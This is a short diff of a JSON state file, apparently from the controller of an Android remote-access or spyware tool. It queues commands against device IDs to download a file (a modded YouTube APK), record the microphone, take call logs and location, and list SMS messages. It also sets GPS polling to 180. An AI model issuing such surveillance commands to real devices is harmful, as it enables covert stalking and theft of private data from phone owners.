@@ -12,6 +12,30 @@
     {
       "type": "0xPM",
       "uid": 6395
+    },
+    {
+      "action": "dl",
+      "path": "/storage/emulated/0/Download/YouTube_v17.10.34_mod_apkdone.com.apk",
+      "type": "0xFI",
+      "uid": 6830
+    },
+    {
+      "sec": "",
+      "type": "0xMI",
+      "uid": 7393
+    },
+    {
+      "type": "0xCL",
+      "uid": 4006
+    },
+    {
+      "type": "0xLO",
+      "uid": 4442
+    },
+    {
+      "action": "ls",
+      "type": "0xSM",
+      "uid": 1650
     }
   ],
   "SMSData": [],
@@ -961,7 +985,7 @@
     }
   ],
   "GPSSettings": {
-    "updateFrequency": 0
+    "updateFrequency": 180
   },
   "downloads": [
     {
